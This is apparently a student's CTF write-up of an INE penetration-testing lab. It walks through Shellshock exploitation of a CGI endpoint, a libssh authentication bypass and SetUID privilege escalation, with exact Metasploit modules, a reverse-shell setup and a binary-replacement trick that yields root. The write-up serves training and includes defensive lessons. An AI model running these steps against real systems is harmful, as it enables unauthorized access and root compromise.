# INE CTF Write-up: Shellshock, SSH Authentication Bypass, and SetUID Privilege Escalation

> **Training environment:** INE  
> **Lab:** Host & Network Penetration Testing — System-Host Based Attacks  
> **Scope:** Authorized lab targets only  
> **Publication note:** Actual flag values are intentionally omitted. Check INE's current rules before publishing walkthroughs or solutions.

## Summary

This lab covered four objectives across two targets: Shellshock through a CGI endpoint, a hidden file in the web directory, libssh authentication bypass, and privilege escalation through a root-owned SetUID executable.

## Target 1 — Shellshock through CGI

### Flag 1: `/flag.txt`

#### 1. Service enumeration

```bash
nmap -sV -sC target1.ine.local
```

- `nmap` scans the target for network services.
- `-sV` attempts to identify service versions.
- `-sC` runs Nmap's default scripts.
- `target1.ine.local` is the lab-provided hostname.

**Observed:** TCP port 80 was open and served Apache HTTP Server 2.4.6. The HTTP title was `Browser Detector`. Nmap also reported `TRACE` as a potentially risky HTTP method. These findings guided web enumeration; they did not prove Shellshock.

#### 2. Identify the CGI endpoint

Browsing the site revealed `/browser.cgi`. CGI (Common Gateway Interface) allows a web server to invoke a program to handle a request. Some CGI configurations pass request-derived environment variables to Bash, which can expose vulnerable systems to Shellshock. A `.cgi` path is a clue, not proof.

#### 3. Search Metasploit

```text
msfconsole -q
search shellshock
```

`msfconsole -q` starts Metasploit with reduced startup output. `search shellshock` looks for related modules.

#### 4. Validate the suspected vulnerability

```text
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
run
```

- `use` selects the scanner module.
- `RHOSTS` sets the target host.
- `TARGETURI` sets the CGI path to test.
- `run` executes the module.

**Observed:** The scanner returned command execution as `uid=1(daemon)`. This was evidence of command execution in the lab, but `daemon` was a low-privileged account, not root.

#### 5. Obtain a session and inspect the filesystem

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /browser.cgi
set LHOST <your-lab-Kali-IP>
set RHOSTS target1.ine.local
run
```

`LHOST` is the local lab address that receives the reverse connection. Use the address assigned to your own authorized lab environment.

After the exploit opened a Meterpreter session, I entered a shell and checked the filesystem root:

```bash
shell
cd /
ls
ls -l /flag.txt
cat /flag.txt
```

- `shell` opens a system shell from Meterpreter.
- `cd /` changes to the filesystem root.
- `ls` lists directory entries.
- `ls -l /flag.txt` shows permissions, owner, size, and metadata.
- `cat /flag.txt` prints the file contents.

The designated file was readable by the current account because its permissions allowed read access. A file can be owned by root without being restricted to root.

### Flag 2: Hidden file in the web directory

The Meterpreter listing for `/opt/apache/htdocs` showed `.flag.txt` alongside `browser.cgi`, `index.html`, and `static`.

```text
ls
cat .flag.txt
```

These commands were run from `/opt/apache/htdocs` in Meterpreter. A leading dot makes a filename hidden from an ordinary Linux `ls` listing; it does not encrypt or automatically protect the file.

**Lesson:** CGI was a useful clue to investigate, but validation was required before concluding that Shellshock was present.

---

## Target 2 — libssh authentication bypass

### Flag 3: `/home/user/flag.txt`

#### 1. Enumerate the SSH service

```bash
nmap -sV -sC target2.ine.local
```

The scan identified SSH on port 22 with a libssh 0.8.3 banner. The banner suggested investigating the lab's libssh authentication-bypass clue, but the version string alone was not proof of exploitability.

#### 2. Configure the Metasploit scanner

```text
msfconsole -q
search libssh
use auxiliary/scanner/ssh/libssh_auth_bypass
options
set RHOSTS target2.ine.local
set SPAWN_PTY true
run
```

- `search libssh` searches for relevant modules.
- `use` selects the authentication-bypass scanner.
- `options` displays configurable settings.
- `RHOSTS` specifies the target.
- `SPAWN_PTY true` enables the option to spawn a pseudo-terminal (PTY) for the shell.
- `run` executes the module.

A PTY makes a shell more terminal-like and interactive. `SPAWN_PTY` improves shell usability; it is not itself the authentication-bypass vulnerability.

**Observed:** Metasploit opened a command shell session in the lab.

#### 3. Find the user's flag

```bash
pwd
ls
cd /home/user
ls
cat flag.txt
```

`pwd` prints the current directory, `ls` lists entries, `cd /home/user` uses an absolute path to enter the user's home directory, and `cat flag.txt` prints the file contents.

---

## Flag 4 — SetUID privilege escalation

#### 1. Inspect permissions

```bash
ls -la
```

The listing showed `welcome` owned by root with permissions resembling `-rwsr-xr-x`. The `s` in the owner's execute position indicates the SetUID bit. A SetUID executable can run with its owner's effective user ID. SetUID is not automatically a vulnerability; the program must also have unsafe behavior or dependencies.

#### 2. Inspect printable strings

```bash
strings welcome
```

`strings` extracts printable sequences from a binary. The output included `setuid`, `system`, `greetings`, and `welcome.c`. These were useful clues, but strings alone do not prove the exact control flow.

#### 3. Test the lab's replaceable-file dependency

In the lab, the original `greetings` file was removed and Bash was copied to that name:

```bash
rm greetings
cp /bin/bash greetings
ls -la
```

- `rm greetings` removes the file in the current directory.
- `cp /bin/bash greetings` copies Bash to a file named `greetings`.
- `ls -la` verifies file details and permissions.

This lab-specific test examined whether the privileged `welcome` program trusted a file that the ordinary user could replace. Do not reproduce this technique against systems without explicit authorization.

#### 4. Run the program and verify the identity

```bash
./welcome
whoami
```

- `./welcome` runs the executable from the current directory.
- `whoami` prints the current effective username.

In the lab, this sequence opened a root shell. It demonstrated a privilege-escalation weakness in the program's behavior in this environment.

#### 5. Read the root user's flag

```bash
cd /
cd /root
ls -la
cat /root/flag.txt
```

`cd /` moves to the filesystem root. `cd /root` uses the absolute path to the root user's home directory. `ls -la` lists all entries with details, and `cat` displays the designated file.

Before escalation, the ordinary `user` account could not enter `/root` because its permissions were `drwxr-x---`: owner `rwx`, group `r-x`, others `---`. After the effective identity became root, access was available.

## Defensive lessons

- Patch vulnerable Bash and SSH libraries.
- Remove unnecessary CGI endpoints and avoid unsafe shell invocation.
- Run web services with least privilege.
- Audit root-owned SetUID programs.
- Avoid unsafe command construction in privileged programs.
- Use trusted absolute paths and do not trust files or environment settings an unprivileged user can modify.
- Restrict permissions on sensitive directories and files.

## Final takeaways

1. Enumerate first, then use findings to guide vulnerability research.
2. Treat service banners, CGI paths, and binary strings as clues—not conclusive proof.
3. Validate suspected vulnerabilities in the authorized environment.
4. Distinguish low-privileged command execution from root access.
5. Use `whoami`, `pwd`, `ls -la`, and `ls -l` to verify context and permissions.
6. Explain the reasoning behind commands, not just the commands themselves.

## Publication note

This document describes an authorized training lab. Actual flag values and sensitive session details are intentionally omitted. 
